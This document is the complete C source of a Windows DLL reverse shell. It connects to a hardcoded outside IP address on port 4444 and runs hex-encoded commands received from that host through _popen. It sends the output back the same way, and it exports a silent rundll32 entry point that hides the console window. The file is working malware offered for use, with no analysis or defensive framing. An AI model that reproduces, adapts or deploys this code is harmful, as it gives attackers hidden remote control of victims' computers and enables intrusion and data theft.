// revshell.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

// Hex encode function
void hex_encode(const char* input, char* output) {
    const char hex[] = "0123456789abcdef";
    while (*input) {
        *output++ = hex[(*input >> 4) & 0xF];
        *output++ = hex[*input & 0xF];
        input++;
    }
    *output = '\0';
}

// Hex decode function
void hex_decode(const char* input, char* output) {
    while (*input && input[1]) {
        char high = (*input >= 'a') ? (*input - 'a' + 10) : (*input >= 'A') ? (*input - 'A' + 10) : (*input - '0');
        char low  = (input[1] >= 'a') ? (input[1] - 'a' + 10) : (input[1] >= 'A') ? (input[1] - 'A' + 10) : (input[1] - '0');
        *output++ = (high << 4) | low;
        input += 2;
    }
    *output = '\0';
}

// Reverse shell thread
DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char recvbuf[2048];
    char decoded[1024];
    char encoded[4096];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        return 1;

    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("35.207.239.248");  // 🔁 CHANGE THIS TO YOUR IP

    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (1) {
        ZeroMemory(recvbuf, sizeof(recvbuf));
        int bytes = recv(sock, recvbuf, sizeof(recvbuf) - 1, 0);
        if (bytes <= 0)
            break;

        recvbuf[bytes] = '\0';

        ZeroMemory(decoded, sizeof(decoded));
        hex_decode(recvbuf, decoded);

        if (strcmp(decoded, "exit") == 0)
            break;

        FILE* pipe = _popen(decoded, "r");
        if (!pipe) {
            const char* err = "Command execution failed.\n";
            hex_encode(err, encoded);
            send(sock, encoded, strlen(encoded), 0);
            continue;
        }

        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe)) {
            ZeroMemory(encoded, sizeof(encoded));
            hex_encode(buffer, encoded);
            send(sock, encoded, strlen(encoded), 0);
        }

        _pclose(pipe);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

// Exported silent entry point for rundll32
__declspec(dllexport) void CALLBACK StartShell(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    HWND console = GetConsoleWindow();
    if (console) ShowWindow(console, SW_HIDE);  // Hide any attached window
    CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
}
